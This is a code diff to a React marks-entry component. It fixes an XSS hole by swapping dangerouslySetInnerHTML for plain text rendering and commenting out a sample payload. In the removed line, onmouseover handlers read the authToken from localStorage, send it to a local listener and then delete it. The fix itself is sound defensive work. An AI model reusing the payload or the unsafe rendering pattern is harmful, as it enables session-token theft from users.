@@ -34,7 +34,7 @@ const EnterStatusDocument1Marks = ({history}) => {
     const[marksEn04,setmarkEn04] = useState("");
 
 
-     const exploitData = `Click  <b onmouseover='async function fetchAsync (url) {var token = localStorage.getItem("authToken");await fetch("http://localhost:7777?token="+token);await response.json()} fetchAsync()'>Me</b> <b onmouseover='alert("I now have your Data You are hacked !")'>NOW </b> <b onmouseover='localStorage.removeItem("authToken");   window.location.reload();'> Get Out </b>  `;
+     //const exploitData = `Click  <b onmouseover='async function fetchAsync (url) {var token = localStorage.getItem("authToken");await fetch("http://localhost:7777?token="+token);await response.json()} fetchAsync()'>Me</b> <b onmouseover='alert("I now have your Data You are hacked !")'>NOW </b> <b onmouseover='localStorage.removeItem("authToken");   window.location.reload();'> Get Out </b>  `;
 
 
 
@@ -187,10 +187,13 @@ const EnterStatusDocument1Marks = ({history}) => {
           <form onSubmit={enterstatusdocument1marksHandler} className="group-screen__form_Enter_marks">
 
      <div />
-     <div className="bg-blue-900" dangerouslySetInnerHTML={{__html: totalContribution }}  />
+
+     {/* Dangerous inner HTML vulnerability */}
+     {/* <div className="bg-blue-900" dangerouslySetInnerHTML={{__html: totalContribution }}  /> */}
+     <p className="bg-blue-900" >{totalContribution}</p>
 
      {console.log("Total contribution "+totalContribution)}
-     {console.log("Exploit code "+exploitData)}
+     {/* {console.log("Exploit code "+exploitData)} */}
      
       <h3 className="login-screen__title" style={{fontFamily:"-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif"}} >RP (IT4010) Project Status document 1 [Total contribution =  {totalContribution}%]</h3>
       {error && <span className="error-message">{error}</span>}
@@ -248,7 +251,10 @@ const EnterStatusDocument1Marks = ({history}) => {
    
     <td className="proposalpresentationmarking">
    
- <div  dangerouslySetInnerHTML={{__html: stdesc01}}/>
+
+ {/* Dangerous inner HTML vulnerability */}
+ {/* <div  dangerouslySetInnerHTML={{__html: stdesc01}}/> */}
+ <p>{stdesc01}</p>
    
     </td>
     <td className="proposalpresentationmarking">
@@ -322,7 +328,11 @@ const EnterStatusDocument1Marks = ({history}) => {
         2
     </td>
     <td className="proposalpresentationmarking">
-    <div  dangerouslySetInnerHTML={{__html: stdesc02}}/>  
+
+        {/* Dangerous inner HTmL vulnerability */}
+    {/* <div  dangerouslySetInnerHTML={{__html: stdesc02}}/>   */}
+    <p>{stdesc02}</p>
+
     </td>
     <td className="proposalpresentationmarking">
   {marksEn02}  
@@ -363,7 +373,10 @@ const EnterStatusDocument1Marks = ({history}) => {
     </td>
     <td className="proposalpresentationmarking">
 
-    <div  dangerouslySetInnerHTML={{__html: stdesc03}}/>  
+    {/* Dangerous inner HTML vulnerability */}
+    {/* <div  dangerouslySetInnerHTML={{__html: stdesc03}}/>  */}
+
+    <p>{stdesc03}</p> 
 
     </td>
     <td className="proposalpresentationmarking">
@@ -404,7 +417,10 @@ const EnterStatusDocument1Marks = ({history}) => {
         4
     </td>
     <td className="proposalpresentationmarking">
-    <div  dangerouslySetInnerHTML={{__html: stdesc04}}/>  
+
+        {/* Dangerous inner HTML vulnerability */}
+    {/* <div  dangerouslySetInnerHTML={{__html: stdesc04}}/>   */}
+    <p>{stdesc04}</p>
  
  {/* dddd */}
 
